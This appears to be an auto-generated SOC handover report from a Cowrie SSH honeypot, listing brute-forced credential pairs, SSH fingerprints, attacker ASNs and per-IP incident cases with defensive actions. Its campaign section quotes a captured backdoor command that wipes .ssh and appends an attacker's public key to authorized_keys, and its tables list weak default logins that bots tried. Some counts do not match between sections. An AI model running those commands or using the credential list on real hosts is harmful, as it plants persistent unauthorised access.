# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-20 |
| **Generated At** | 2026-07-20T23:04:44Z |
| **Shift Time** | 23:04 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **140** |
| Confirmed Threats | **125** |
| False Positives Filtered | **15** (10.7%) |
| Unique Attacker IPs | **95** |
| Countries of Origin | **28** |
| High Severity Cases | **87** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **53** |
| Malware Samples Analyzed | **2** HIGH · **31** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **112** |
| Unique Credential Pairs | **46** |
| Unique Usernames | **23** |
| Unique Passwords | **40** |
| Successful Auth Pairs | **99** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 13 |
| `blank` | 11 |
| `operator` | 9 |
| `admin` | 8 |
| `345gs5662d34` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 8 |
| `3245gs5662d34` | 7 |
| `555555` | 6 |
| `12345` | 5 |
| `administrator` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 8 |
| `blank` | `555555` | 6 |
| `Root` | `12345` | 5 |
| `ubuntu` | `administrator` | 5 |
| `debian` | `121212` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `unknown` | `333` | `222.120.176.6` | 2026-07-20T21:00:24 |
| `unknown` | `333` | `116.48.138.69` | 2026-07-20T21:00:32 |
| `operator` | `1234` | `23.30.11.253` | 2026-07-20T21:00:55 |
| `operator` | `1234` | `182.53.52.68` | 2026-07-20T21:01:09 |
| `centos` | `passwd` | `200.232.114.71` | 2026-07-20T21:03:37 |
| `centos` | `passwd` | `111.70.32.53` | 2026-07-20T21:03:51 |
| `unknown` | `333` | `10.0.0.73` | 2026-07-20T21:04:12 |
| `operator` | `1234` | `10.0.0.73` | 2026-07-20T21:04:42 |
| `centos` | `passwd` | `218.206.136.24` | 2026-07-20T21:07:06 |
| `centos` | `passwd` | `153.37.177.219` | 2026-07-20T21:07:20 |
| `support` | `support` | `176.53.159.196` | 2026-07-20T21:10:10 |
| `support` | `support` | `10.0.0.73` | 2026-07-20T21:11:31 |
| `Root` | `12345` | `220.180.249.165` | 2026-07-20T21:14:23 |
| `Root` | `12345` | `101.13.5.49` | 2026-07-20T21:17:43 |
| `Root` | `12345` | `111.39.206.23` | 2026-07-20T21:17:58 |
| `Root` | `12345` | `10.0.0.73` | 2026-07-20T21:18:05 |
| `ubuntu` | `mtaserver` | `10.0.0.73` | 2026-07-20T21:23:03 |
| `ubuntu` | `mtaserver` | `185.242.3.195` | 2026-07-20T21:24:20 |
| `operator` | `operator2015` | `45.55.133.80` | 2026-07-20T21:24:20 |
| `centos` | `centos999` | `196.216.81.126` | 2026-07-20T21:24:55 |
| `operator` | `operator2015` | `50.187.155.130` | 2026-07-20T21:27:28 |
| `operator` | `operator2015` | `112.94.5.43` | 2026-07-20T21:27:38 |
| `debian` | `abc123` | `121.22.99.2` | 2026-07-20T21:28:02 |
| `centos` | `centos999` | `65.20.251.41` | 2026-07-20T21:28:15 |
| `centos` | `centos999` | `122.117.30.20` | 2026-07-20T21:28:24 |
| `debian` | `abc123` | `31.173.0.46` | 2026-07-20T21:31:30 |
| `root` | `privatessh` | `185.242.3.195` | 2026-07-20T21:31:55 |
| `operator` | `00` | `34.146.217.105` | 2026-07-20T21:38:48 |
| `root` | `1qaz2WSX` | `116.135.67.93` | 2026-07-20T21:40:12 |
| `345gs5662d34` | `345gs5662d34` | `116.135.67.93` | 2026-07-20T21:40:16 |
| `macuser` | `macuser` | `176.31.21.38` | 2026-07-20T21:41:53 |
| `345gs5662d34` | `345gs5662d34` | `176.31.21.38` | 2026-07-20T21:41:56 |
| `macuser` | `3245gs5662d34` | `176.31.21.38` | 2026-07-20T21:41:56 |
| `operator` | `00` | `221.182.185.190` | 2026-07-20T21:42:01 |
| `operator` | `00` | `112.161.26.125` | 2026-07-20T21:42:15 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-20T21:44:06 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-20T21:44:06 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-20T21:44:15 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-20T21:45:01 |
| `kaumudi` | `kaumudi123` | `85.198.19.242` | 2026-07-20T21:46:07 |
| `345gs5662d34` | `345gs5662d34` | `85.198.19.242` | 2026-07-20T21:46:14 |
| `kaumudi` | `3245gs5662d34` | `85.198.19.242` | 2026-07-20T21:46:17 |
| `root` | `iddqdidkfa` | `43.157.248.241` | 2026-07-20T21:47:36 |
| `345gs5662d34` | `345gs5662d34` | `43.157.248.241` | 2026-07-20T21:47:40 |
| `root` | `3245gs5662d34` | `43.157.248.241` | 2026-07-20T21:47:42 |
| `mysql` | `12345678` | `179.185.227.77` | 2026-07-20T21:49:19 |
| `filezilla` | `filezilla` | `191.205.210.9` | 2026-07-20T21:49:38 |
| `345gs5662d34` | `345gs5662d34` | `191.205.210.9` | 2026-07-20T21:49:41 |
| `filezilla` | `3245gs5662d34` | `191.205.210.9` | 2026-07-20T21:49:42 |
| `config` | `p@ssword` | `50.217.40.11` | 2026-07-20T21:50:29 |
| `config` | `p@ssword` | `122.187.227.145` | 2026-07-20T21:50:41 |
| `ubnt` | `qwerty12345` | `61.2.228.177` | 2026-07-20T21:52:20 |
| `ubnt` | `qwerty12345` | `150.228.187.139` | 2026-07-20T21:52:29 |
| `mysql` | `12345678` | `218.149.235.152` | 2026-07-20T21:52:51 |
| `mysql` | `12345678` | `10.0.0.73` | 2026-07-20T21:53:10 |
| `alexis` | `alexis` | `118.194.228.101` | 2026-07-20T21:55:31 |
| `345gs5662d34` | `345gs5662d34` | `118.194.228.101` | 2026-07-20T21:55:34 |
| `alexis` | `3245gs5662d34` | `118.194.228.101` | 2026-07-20T21:55:35 |
| `ubnt` | `qwerty12345` | `122.170.99.195` | 2026-07-20T21:55:39 |
| `ubnt` | `qwerty12345` | `10.0.0.73` | 2026-07-20T21:56:11 |
| `root` | `` | `47.77.239.231` | 2026-07-20T22:00:48 |
| `nagios` | `nagios` | `182.151.45.136` | 2026-07-20T22:03:14 |
| `nagios` | `nagios` | `178.178.222.55` | 2026-07-20T22:03:21 |
| `nagios` | `nagios` | `10.0.0.73` | 2026-07-20T22:06:46 |
| `supervisor` | `supervisor2006` | `112.6.127.244` | 2026-07-20T22:10:43 |
| `supervisor` | `supervisor2006` | `50.217.40.11` | 2026-07-20T22:10:50 |
| `blank` | `555555` | `170.233.29.157` | 2026-07-20T22:13:54 |
| `supervisor` | `supervisor2006` | `81.237.155.113` | 2026-07-20T22:13:55 |
| `blank` | `555555` | `208.96.233.67` | 2026-07-20T22:14:01 |
| `root` | `privatessh` | `10.0.0.73` | 2026-07-20T22:15:58 |
| `blank` | `555555` | `178.178.194.123` | 2026-07-20T22:17:11 |
| `blank` | `555555` | `65.20.138.46` | 2026-07-20T22:17:18 |
| `blank` | `555555` | `10.0.0.73` | 2026-07-20T22:17:31 |
| `blank` | `0987654321` | `130.185.96.113` | 2026-07-20T22:20:06 |
| `blank` | `0987654321` | `85.19.195.12` | 2026-07-20T22:20:12 |
| `blank` | `0987654321` | `10.0.0.73` | 2026-07-20T22:20:29 |
| `cheryl` | `123@cheryl` | `185.242.3.195` | 2026-07-20T22:24:51 |
| `david` | `david` | `185.100.84.174` | 2026-07-20T22:28:31 |
| `administrador` | `administrador1` | `147.45.48.17` | 2026-07-20T22:29:27 |
| `345gs5662d34` | `345gs5662d34` | `147.45.48.17` | 2026-07-20T22:29:30 |
| `administrador` | `3245gs5662d34` | `147.45.48.17` | 2026-07-20T22:29:31 |
| `unknown` | `8` | `218.13.214.18` | 2026-07-20T22:31:20 |
| `unknown` | `8` | `10.0.0.73` | 2026-07-20T22:31:44 |
| `admin` | `admin2003` | `171.8.42.112` | 2026-07-20T22:33:55 |
| `admin` | `admin2003` | `58.245.210.70` | 2026-07-20T22:34:04 |
| `admin` | `admin2003` | `103.68.22.140` | 2026-07-20T22:37:04 |
| `admin` | `admin2003` | `117.2.123.19` | 2026-07-20T22:37:15 |
| `ubuntu` | `administrator` | `182.73.164.228` | 2026-07-20T22:38:21 |
| `ubuntu` | `administrator` | `197.156.97.198` | 2026-07-20T22:38:28 |
| `debian` | `121212` | `34.146.217.105` | 2026-07-20T22:41:15 |
| `ubuntu` | `administrator` | `178.178.222.60` | 2026-07-20T22:41:48 |
| `ubuntu` | `administrator` | `10.0.0.73` | 2026-07-20T22:42:10 |
| `root` | `sistemas` | `139.59.36.109` | 2026-07-20T22:43:05 |
| `345gs5662d34` | `345gs5662d34` | `139.59.36.109` | 2026-07-20T22:43:09 |
| `root` | `3245gs5662d34` | `139.59.36.109` | 2026-07-20T22:43:10 |
| `debian` | `121212` | `200.159.14.187` | 2026-07-20T22:44:28 |
| `debian` | `121212` | `203.252.10.3` | 2026-07-20T22:44:37 |
| `debian` | `121212` | `10.0.0.73` | 2026-07-20T22:44:53 |
| `blank` | `55` | `178.178.194.123` | 2026-07-20T22:52:35 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **140** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 53 |
| libssh | 32 |
| Go SSH scanner | 8 |
| Paramiko (Python) | 4 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 53 | 50 |
| `f555226df196...` | Mirai/variant | 24 | 8 |
| `16443846184e...` | Generic scanner | 5 | 2 |
| `a2de0f306611...` | Mirai/variant | 4 | 1 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 53 | 50 | Mirai/variant |
| `f555226df196...` | libssh | 24 | 8 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 2 | — |
| `16443846184e...` | Go SSH scanner | 5 | 2 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `116.135.67.93`, `191.205.210.9`, `85.198.19.242`, `139.59.36.109`, `43.157.248.241`, `118.194.228.101`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **95** |
| Unique ASNs | **64** |
| High-Risk ASNs | **59** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS25159` | PJSC MegaFon | 4 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS396982` | Google LLC | 4 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS7922` | Comcast Cable Communications, LLC | 3 | HIGH |
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (87)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-da4b9c45408b

| Field | Detail |
|---|---|
| **Source IP** | `222.120.176[.]6` |
| **First Seen** | 2026-07-20 21:00 |
| **Last Seen** | 2026-07-20 21:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:00:21` | `cowrie.session.connect` |
| `2026-07-20 21:00:22` | `cowrie.client.version` |
| `2026-07-20 21:00:22` | `cowrie.client.kex` |
| `2026-07-20 21:00:24` | `cowrie.login.success` |
| `2026-07-20 21:00:24` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:00:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.120.176[.]6` to AbuseIPDB if not already reported
- [ ] Block `222.120.176[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ede19de0568

| Field | Detail |
|---|---|
| **Source IP** | `116.48.138[.]69` |
| **First Seen** | 2026-07-20 21:00 |
| **Last Seen** | 2026-07-20 21:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:00:30` | `cowrie.session.connect` |
| `2026-07-20 21:00:30` | `cowrie.client.version` |
| `2026-07-20 21:00:30` | `cowrie.client.kex` |
| `2026-07-20 21:00:32` | `cowrie.login.success` |
| `2026-07-20 21:00:33` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:00:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.48.138[.]69` to AbuseIPDB if not already reported
- [ ] Block `116.48.138[.]69` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16d39dfc8e2c

| Field | Detail |
|---|---|
| **Source IP** | `23.30.11[.]253` |
| **First Seen** | 2026-07-20 21:00 |
| **Last Seen** | 2026-07-20 21:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:00:53` | `cowrie.session.connect` |
| `2026-07-20 21:00:54` | `cowrie.client.version` |
| `2026-07-20 21:00:54` | `cowrie.client.kex` |
| `2026-07-20 21:00:55` | `cowrie.login.success` |
| `2026-07-20 21:00:56` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.30.11[.]253` to AbuseIPDB if not already reported
- [ ] Block `23.30.11[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a8ec92c26dd

| Field | Detail |
|---|---|
| **Source IP** | `182.53.52[.]68` |
| **First Seen** | 2026-07-20 21:01 |
| **Last Seen** | 2026-07-20 21:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:01:06` | `cowrie.session.connect` |
| `2026-07-20 21:01:07` | `cowrie.client.version` |
| `2026-07-20 21:01:07` | `cowrie.client.kex` |
| `2026-07-20 21:01:09` | `cowrie.login.success` |
| `2026-07-20 21:01:09` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:01:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.53.52[.]68` to AbuseIPDB if not already reported
- [ ] Block `182.53.52[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70f08afd4aad

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-07-20 21:03 |
| **Last Seen** | 2026-07-20 21:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:03:35` | `cowrie.session.connect` |
| `2026-07-20 21:03:35` | `cowrie.client.version` |
| `2026-07-20 21:03:35` | `cowrie.client.kex` |
| `2026-07-20 21:03:37` | `cowrie.login.success` |
| `2026-07-20 21:03:38` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f774432c5c4d

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]53` |
| **First Seen** | 2026-07-20 21:03 |
| **Last Seen** | 2026-07-20 21:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:03:48` | `cowrie.session.connect` |
| `2026-07-20 21:03:49` | `cowrie.client.version` |
| `2026-07-20 21:03:49` | `cowrie.client.kex` |
| `2026-07-20 21:03:51` | `cowrie.login.success` |
| `2026-07-20 21:03:51` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:03:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]53` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2148809ab1b8

| Field | Detail |
|---|---|
| **Source IP** | `218.206.136[.]24` |
| **First Seen** | 2026-07-20 21:07 |
| **Last Seen** | 2026-07-20 21:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:07:04` | `cowrie.session.connect` |
| `2026-07-20 21:07:04` | `cowrie.client.version` |
| `2026-07-20 21:07:04` | `cowrie.client.kex` |
| `2026-07-20 21:07:06` | `cowrie.login.success` |
| `2026-07-20 21:07:07` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:07:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.206.136[.]24` to AbuseIPDB if not already reported
- [ ] Block `218.206.136[.]24` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62348c68a20f

| Field | Detail |
|---|---|
| **Source IP** | `153.37.177[.]219` |
| **First Seen** | 2026-07-20 21:07 |
| **Last Seen** | 2026-07-20 21:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:07:17` | `cowrie.session.connect` |
| `2026-07-20 21:07:18` | `cowrie.client.version` |
| `2026-07-20 21:07:18` | `cowrie.client.kex` |
| `2026-07-20 21:07:20` | `cowrie.login.success` |
| `2026-07-20 21:07:21` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:07:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.37.177[.]219` to AbuseIPDB if not already reported
- [ ] Block `153.37.177[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d0132388d42

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-20 21:10 |
| **Last Seen** | 2026-07-20 21:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:10:09` | `cowrie.session.connect` |
| `2026-07-20 21:10:09` | `cowrie.client.version` |
| `2026-07-20 21:10:09` | `cowrie.client.kex` |
| `2026-07-20 21:10:10` | `cowrie.login.success` |
| `2026-07-20 21:10:10` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:10:10` | `cowrie.direct-tcpip.data` |
| `2026-07-20 21:10:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eae1b1183731

| Field | Detail |
|---|---|
| **Source IP** | `220.180.249[.]165` |
| **First Seen** | 2026-07-20 21:14 |
| **Last Seen** | 2026-07-20 21:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:14:21` | `cowrie.session.connect` |
| `2026-07-20 21:14:21` | `cowrie.client.version` |
| `2026-07-20 21:14:21` | `cowrie.client.kex` |
| `2026-07-20 21:14:23` | `cowrie.login.success` |
| `2026-07-20 21:14:24` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:14:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.180.249[.]165` to AbuseIPDB if not already reported
- [ ] Block `220.180.249[.]165` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-700ba81bc4db

| Field | Detail |
|---|---|
| **Source IP** | `101.13.5[.]49` |
| **First Seen** | 2026-07-20 21:17 |
| **Last Seen** | 2026-07-20 21:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:17:41` | `cowrie.session.connect` |
| `2026-07-20 21:17:41` | `cowrie.client.version` |
| `2026-07-20 21:17:41` | `cowrie.client.kex` |
| `2026-07-20 21:17:43` | `cowrie.login.success` |
| `2026-07-20 21:17:44` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.5[.]49` to AbuseIPDB if not already reported
- [ ] Block `101.13.5[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6138434e43b6

| Field | Detail |
|---|---|
| **Source IP** | `111.39.206[.]23` |
| **First Seen** | 2026-07-20 21:17 |
| **Last Seen** | 2026-07-20 21:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:17:54` | `cowrie.session.connect` |
| `2026-07-20 21:17:55` | `cowrie.client.version` |
| `2026-07-20 21:17:55` | `cowrie.client.kex` |
| `2026-07-20 21:17:58` | `cowrie.login.success` |
| `2026-07-20 21:17:58` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:18:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.39.206[.]23` to AbuseIPDB if not already reported
- [ ] Block `111.39.206[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9274ce368210

| Field | Detail |
|---|---|
| **Source IP** | `45.55.133[.]80` |
| **First Seen** | 2026-07-20 21:24 |
| **Last Seen** | 2026-07-20 21:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:24:18` | `cowrie.session.connect` |
| `2026-07-20 21:24:19` | `cowrie.client.version` |
| `2026-07-20 21:24:19` | `cowrie.client.kex` |
| `2026-07-20 21:24:20` | `cowrie.login.success` |
| `2026-07-20 21:24:21` | `cowrie.direct-tcpip.request` |
| `2026-07-20 21:24:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.55.133[.]80` to AbuseIPDB if not already reported
- [ ] Block `45.55.133[.]80` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ec020f31dfc

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-20 21:24 |
| **Last Seen** | 2026-07-20 21:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 21:24:19` | `cowrie.session.connect` |
| `2026-07-20 21:24:19` | `cowrie.client.version` |
| `2026-07-20 21:24:19` | `cowrie.client.kex` |
| `2026-07-20 21:24:20` | `cowrie.login.success` |
| `2026-07-20 21:24:20` | `cowrie.session.params` |
| `2026-07-20 21:24:20` | `cowrie.command.input` |
| `2026-07-20 21:24:21` | `cowrie.log.closed` |
| `2026-07-20 21:24:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

